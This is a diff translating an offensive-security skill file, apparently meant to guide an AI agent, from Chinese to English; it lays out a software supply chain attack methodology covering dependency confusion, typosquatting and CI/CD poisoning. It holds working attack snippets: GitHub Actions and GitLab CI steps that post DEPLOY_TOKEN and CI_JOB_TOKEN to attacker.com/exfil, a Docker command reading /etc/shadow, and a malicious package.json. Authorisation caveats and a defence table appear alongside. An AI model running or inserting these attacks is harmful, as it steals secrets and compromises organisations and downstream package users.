@@ -1,73 +1,75 @@
 ---
 name: supply-chain-attack
-description: "软件供应链攻击方法论。当目标使用 npm/PyPI/Maven 等包管理器、有私有仓库、使用 CI/CD Pipeline 时使用。覆盖 Dependency Confusion、Typosquatting、恶意包发布、CI/CD 投毒、构建服务器攻击"
+description: "Software supply chain attack methodology. Use when the target uses package managers such as npm/PyPI/Maven, has private registries, or uses CI/CD pipelines. Covers Dependency Confusion, Typosquatting, malicious package publication, CI/CD poisoning, and build server attacks"
+zh-signals: "软件供应链攻击方法，涵盖依赖混淆、名称抢注、恶意包发布与 CI/CD 投毒。信号:供应链攻击,依赖混淆,名称抢注,npm,CI/CD 投毒"
+when-to-use: "Use when the target uses npm/PyPI/Maven, private registries, or CI/CD pipelines and supply-chain attack paths are in scope."
 metadata:
-  tags: "supply-chain,dependency confusion,typosquatting,npm,pypi,cicd,pipeline,供应链,依赖混淆"
+  tags: "supply-chain,dependency confusion,typosquatting,npm,pypi,cicd,pipeline,supply chain,dependency confusion"
   category: "exploit"
   mitre_attack: "T1195.001,T1195.002,T1199"
 ---
 
-# 软件供应链攻击方法论
+# Software Supply Chain Attack Methodology
 
-> **核心思路**：不攻击目标本身，攻击目标信任的上游依赖/构建流程
+> **Core idea**: don't attack the target itself, attack the upstream dependencies/build pipeline it trusts
 
-## ⛔ 深入参考
+## ⛔ Further Reading
 
-- Dependency Confusion 详细利用步骤 → [references/dependency-confusion.md](references/dependency-confusion.md)
-- CI/CD Pipeline 攻击向量 → [references/cicd-attack.md](references/cicd-attack.md)
+- Detailed Dependency Confusion exploitation steps → [references/dependency-confusion.md](references/dependency-confusion.md)
+- CI/CD Pipeline attack vectors → [references/cicd-attack.md](references/cicd-attack.md)
 
 ---
 
-## 攻击面识别
+## Attack Surface Identification
 
 ```
-目标使用什么包管理器？
-├─ npm (Node.js) → npmjs.com 检查
-├─ PyPI (Python) → pypi.org 检查
-├─ Maven (Java) → mvnrepository.com 检查
-├─ NuGet (.NET) → nuget.org 检查
+Which package manager does the target use?
+├─ npm (Node.js) → check npmjs.com
+├─ PyPI (Python) → check pypi.org
+├─ Maven (Java) → check mvnrepository.com
+├─ NuGet (.NET) → check nuget.org
 ├─ Go modules → proxy.golang.org
 ├─ RubyGems → rubygems.org
-└─ 容器镜像 → Docker Hub / 私有 Registry
+└─ Container images → Docker Hub / private registry
 
-目标有私有仓库？
-├─ 是 → Dependency Confusion 首选
-└─ 否 → Typosquatting / 已有包投毒
+Does the target have a private registry?
+├─ Yes → Dependency Confusion is the first choice
+└─ No → Typosquatting / poisoning of an existing package
 ```
 
-## Phase 1: Dependency Confusion（依赖混淆）
+## Phase 1: Dependency Confusion
 
-### 原理
+### How It Works
 
 ```
-企业内部包: @company/utils (版本 1.0.0, 私有仓库)
-攻击者发布: company-utils (版本 99.0.0, 公共 npm)
+Internal company package: @company/utils (version 1.0.0, private registry)
+Attacker publishes: company-utils (version 99.0.0, public npm)
 
-如果包管理器优先从公共源拉取高版本 → 恶意包被安装
+If the package manager prefers the higher version from the public source → the malicious package gets installed
 ```
 
-### 发现私有包名
+### Discovering Private Package Names
 
 ```bash
-# 1. 从目标网站 JS 中提取包名
+# 1. Extract package names from the target site's JavaScript
 curl -s https://target.com | grep -oE "from ['\"]@[a-zA-Z0-9/-]+['\"]"
 curl -s https://target.com/main.js | grep -oE "require\(['\"][^'\"]+['\"]\)"
 
-# 2. 从泄露的 package.json / requirements.txt
-# GitHub/GitLab 搜索
-# 目标开源项目的依赖文件
+# 2. From leaked package.json / requirements.txt
+# GitHub/GitLab search
+# Dependency files of the target's open source projects
 
-# 3. DNS 探测（某些私有 npm 使用 DNS CNAME）
+# 3. DNS probing (some private npm registries use a DNS CNAME)
 dig +short _npmrc.target.com
 
-# 4. 错误信息泄露
-# 404 页面可能暴露内部包名
+# 4. Error message leaks
+# The 404 page may expose internal package names
 ```
 
-### 攻击执行（npm 示例）
+### Attack Execution (npm example)
 
 ```json
-// package.json — 恶意包
+// package.json — malicious package
 {
   "name": "target-internal-utils",
   "version": "99.0.0",
@@ -78,141 +80,141 @@ dig +short _npmrc.target.com
 ```
 
 ```bash
-# 发布到公共 npm
+# Publish to the public npm registry
 npm publish
 
-# 等待目标 CI/CD 在下次构建时拉取
+# Wait for the target CI/CD pipeline to pull it on the next build
 ```
 
-### 各包管理器差异
+### Package Manager Differences
 
-| 包管理器 | Confusion 条件 | 防御 |
+| Package manager | Confusion condition | Defense |
 |---------|--------------|------|
-| npm | 无 scope(@) 前缀 + 无 .npmrc 锁定 | 使用 @scope + registry 锁定 |
-| pip | 无 --index-url 锁定 + 无 --extra-index-url | 使用 --index-url 唯一源 |
-| Maven | 无 mirrorOf 配置 | 使用 repository 白名单 |
-| NuGet | 多源配置 + 无版本锁定 | 使用 nuget.config 锁定源 |
+| npm | No scope(@) prefix + no .npmrc pinning | Use @scope + registry pinning |
+| pip | No --index-url pinning + no --extra-index-url | Use a single source via --index-url |
+| Maven | No mirrorOf configuration | Use a repository allowlist |
+| NuGet | Multi-source configuration + no version pinning | Pin the source with nuget.config |
 
-## Phase 2: Typosquatting（拼写抢注）
+## Phase 2: Typosquatting
 
 ```bash
-# 生成目标包的相似名称
+# Generate lookalike names for the target package
 # crossenv vs cross-env
 # electorn vs electron
 # cofee-script vs coffee-script
 
-# Python 实现
+# Python implementation
 python3 -c "
 import itertools
 pkg = 'requests'
 typos = []
-# 删除一个字符
+# delete one character
 for i in range(len(pkg)):
     typos.append(pkg[:i] + pkg[i+1:])
-# 替换相邻字符
+# swap adjacent characters
 for i in range(len(pkg)-1):
     typos.append(pkg[:i] + pkg[i+1] + pkg[i] + pkg[i+2:])
-# 增加常见后缀
+# add common suffixes
 typos.extend([pkg+'-python', pkg+'-py', 'python-'+pkg, pkg+'2', pkg+'3'])
 print('\n'.join(set(typos)))
 "
 
-# 检查哪些名称在公共源上未被注册
-# npm: npm view <name> 返回 404 = 可注册
-# PyPI: curl -s https://pypi.org/pypi/<name>/json 返回 404 = 可注册
+# Check which names are not yet registered on the public registries
+# npm: npm view <name> returns 404 = registerable
+# PyPI: curl -s https://pypi.org/pypi/<name>/json returns 404 = registerable
 ```
 
-## Phase 3: CI/CD Pipeline 攻击
+## Phase 3: CI/CD Pipeline Attacks
 
-### 攻击向量
+### Attack Vectors
 
 ```
-CI/CD 攻击面：
-├─ 代码仓库
-│   ├─ PR 注入（恶意 PR 修改 CI 配置）
-│   ├─ Branch Protection 绕过
-│   └─ Webhook 劫持
+CI/CD attack surface:
+├─ Source repository
+│   ├─ PR injection (a malicious PR modifies CI configuration)
+│   ├─ Branch Protection bypass
+│   └─ Webhook hijacking
 │
-├─ 构建环境
-│   ├─ 构建脚本注入（Makefile/Dockerfile/Jenkinsfile）
-│   ├─ 环境变量窃取（secrets in env）
-│   ├─ 构建缓存投毒
-│   └─ 共享 Runner 逃逸
+├─ Build environment
+│   ├─ Build script injection (Makefile/Dockerfile/Jenkinsfile)
+│   ├─ Environment variable theft (secrets in env)
+│   ├─ Build cache poisoning
+│   └─ Shared Runner escape
 │
-├─ 制品仓库
-│   ├─ 镜像替换（tag 覆盖）
-│   ├─ 包签名绕过
-│   └─ 版本号抢注
+├─ Artifact repository
+│   ├─ Image replacement (tag overwrite)
+│   ├─ Package signature bypass
+│   └─ Version number squating
 │
-└─ 部署环节
-    ├─ 部署密钥窃取
-    ├─ 配置注入（Helm values/Terraform vars）
-    └─ 运行时环境变量注入
+└─ Deployment phase
+    ├─ Deployment key theft
+    ├─ Configuration injection (Helm values/Terraform vars)
+    └─ Runtime environment variable injection
 ```
 
-### GitHub Actions 攻击示例
+### GitHub Actions Attack Example
 
 ```yaml
-# 恶意 PR 中修改 .github/workflows/ci.yml
-# 或利用 pull_request_target 事件（在 base 上下文执行，可访问 secrets）
+# Modify .github/workflows/ci.yml in a malicious PR
+# Or abuse the pull_request_target event (runs in the base context, can access secrets)
 name: CI
 on:
-  pull_request_target:  # ⛔ 危险：在有 secrets 的上下文执行
+  pull_request_target:  # ⛔ DANGER: executes in a context that holds secrets
 jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v3
         with:
-          ref: ${{ github.event.pull_request.head.sha }}  # 检出攻击者代码
+          ref: ${{ github.event.pull_request.head.sha }}  # check out the attacker code
       - run: |
-          # 窃取仓库 secrets
+          # steal repository secrets
           curl -X POST https://attacker.com/exfil \
             -d "token=${{ secrets.DEPLOY_TOKEN }}"
 ```
 
-### GitLab CI/CD 攻击
+### GitLab CI/CD Attacks
 
 ```yaml
-# .gitlab-ci.yml 注入
+# .gitlab-ci.yml injection
 stages:
   - build
 
 build:
   stage: build
   script:
-    # 利用 CI/CD 变量窃取
+    # abuse CI/CD variables to steal secrets
     - "curl https://attacker.com/exfil?key=$CI_JOB_TOKEN"
-    # 或利用共享 Runner 的 Docker socket
+    # or abuse the Docker socket of a shared Runner
     - docker run -v /:/host alpine cat /host/etc/shadow
 ```
 
-## Phase 4: 恶意包载荷设计
+## Phase 4: Malicious Package Payload Design
 
 ```
-安装时回调（验证攻击可达性）：
+Callback on install (to verify attack reachability):
 ├─ npm: scripts.preinstall / postinstall
-├─ pip: setup.py install（setup() 执行时）
+├─ pip: setup.py install (runs during setup())
 ├─ Maven: maven-exec-plugin in pom.xml
-└─ Go: init() 函数
+└─ Go: init() function
 
-⛔ 合法红队测试中：
-├─ 只做 DNS/HTTP 回调确认可达
-├─ 不窃取实际数据
-├─ 不部署持久化
-├─ 包中注明"This is a security test"
-└─ 及时联系目标安全团队报告
+⛔ In legitimate red team testing:
+├─ Only perform DNS/HTTP callbacks to confirm reachability
+├─ Do not exfiltrate real data
+├─ Do not deploy persistence
+├─ State "This is a security test" inside the package
+└─ Contact the target's security team promptly to report the findings
 ```
 
-## OPSEC 注意事项
+## OPSEC Notes
 
 ```
-供应链攻击的法律风险极高：
-├─ ⛔ 未授权的 Dependency Confusion 可能构成犯罪
-├─ ⛔ Typosquatting 公共包影响非目标用户
-├─ ✓ 必须有明确书面授权
-├─ ✓ 回调仅收集最小信息（包名+主机名）
-├─ ✓ 包描述中注明安全测试
-└─ ✓ 测试后立即撤下恶意包
+Supply chain attacks carry very high legal risk:
+├─ ⛔ Unauthorized Dependency Confusion may constitute a crime
+├─ ⛔ Typosquatting public packages affects non-target users
+├─ ✓ Explicit written authorization is mandatory
+├─ ✓ Callbacks collect only the minimum information (package name + hostname)
+├─ ✓ Note in the package description that this is a security test
+└─ ✓ Take the malicious package down immediately after the test
 ```
 
